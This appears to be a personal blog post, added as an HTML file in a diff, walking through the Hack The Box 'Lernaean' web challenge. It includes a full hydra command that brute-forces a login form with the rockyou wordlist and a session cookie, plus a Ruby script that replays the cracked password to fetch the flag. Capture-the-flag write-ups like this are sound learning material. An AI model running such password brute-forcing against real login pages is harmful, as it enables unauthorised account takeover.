@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Lernaean</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Lernaean"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-lernaean/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Lernaean" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">17</span>
+        <span class="rest">Jun 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Lernaean </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>&quot;Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!&quot;</p>
+<p>This challenge wasn't too bad. The parts that I struggled with was getting the right syntax for hydra and putting together a post request script in Ruby which I've partially borrowed from Emdee five for life - Web challenge.</p>
+<p>To start off with this challenge, it was a simple textbox that you need to input a password. To brute force the password, <code>hydra</code> and <code>rockyou.txt</code> was used for this task.</p>
+<p>We need to grab the cookie first and pass onto hydra.</p>
+<p><img src="https://johntuyen.com/posts/htb-lernaean/htb-lernaean-cookie.png" alt="htb-lernaean-cookie.png" /></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>hydra -l dummy -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu -s 36029 http-post-form &quot;/index.php:user=^USER^&amp;password=^PASS^:Invalid password:h=Cookie: PHPSESSID=guu956jep1i9qdk0a5huo3u4c0&quot; -V
+</span></code></pre>
+</li>
+<li>
+<p>I struggled with hydra because I thought that the first part of the ternary required /index.php or something because it kept rejecting &quot;/&quot; as a parameter. I used dirbuster to find out if <code>index.php</code> is the correct page to be using. Now that I think of it, why did I use dirbuster just for that purpose.</p>
+<p>The other part is the 3rd parameter of the ternary: &quot;Invalid password&quot;. I did not know that this field had to match the output of the result. All the tutorials that I've read online doesn't really mention about this field. If I entered some other text, the results will show all as matching passwords.</p>
+<p><img src="https://johntuyen.com/posts/htb-lernaean/htb-lernaean-hydra.png" alt="htb-lernaean-hydra" /></p>
+<p>As you can now see, the password is &quot;leonardo&quot;. Upon inputting this password into the field, it redirects to a new page and tells us that we're too slow.</p>
+<p><img src="https://johntuyen.com/posts/htb-lernaean/htb-lernaean-tooslow.png" alt="htb-lernaean-tooslow" /></p>
+<p>I took a look at the source page for possible flags but I didn't see any.</p>
+</li>
+<li>
+<p>At this point, I figured maybe it's a false password that led me to a wrong path. I removed the password from <code>rockyou.txt</code> and continued with brute forcing the password and see if it leads me anywhere. After an hour, I gave up and started to write my POST script.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>require &#39;net/http&#39;
+</span><span>require &#39;uri&#39;
+</span><span>
+</span><span>uri = URI.parse(&quot;http://docker.hackthebox.eu&quot;)
+</span><span>uri.scheme = &quot;http&quot;
+</span><span>uri.host = &quot;docker.hackthebox.eu&quot;
+</span><span>uri.port = 36029
+</span><span>uri.path = &quot;/&quot;
+</span><span>
+</span><span>http = Net::HTTP::new(uri.host, uri.port)
+</span><span>
+</span><span>get_request = Net::HTTP::Get.new(uri.request_uri)
+</span><span>get_response = http.request(get_request)
+</span><span># puts http.request(get_request).body
+</span><span>
+</span><span>cookies = get_response.response[&#39;set-cookie&#39;]
+</span><span>
+</span><span>post_request = Net::HTTP::Post.new(uri.request_uri)
+</span><span>
+</span><span>password = &quot;leonardo&quot;
+</span><span>
+</span><span>post_request.set_form_data(&quot;password&quot; =&gt; password)
+</span><span>
+</span><span>post_request[&#39;Cookie&#39;] = cookies
+</span><span>
+</span><span>post_response = http.request(post_request)
+</span><span>
+</span><span>puts post_response.body
+</span></code></pre>
+<p>Running the script will show the HTB flag.</p>
+<p><img src="https://johntuyen.com/posts/htb-lernaean/htb-lernaean-flag.png" alt="htb-lernaean-flag" /></p>
+<p><code>Protip</code>{: .info }</p>
+<p>Useful link: <a href="https://www.hempstutorials.co.uk/brute-forcing-passwords-with-thc-hydra/">https://www.hempstutorials.co.uk/brute-forcing-passwords-with-thc-hydra/</a></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
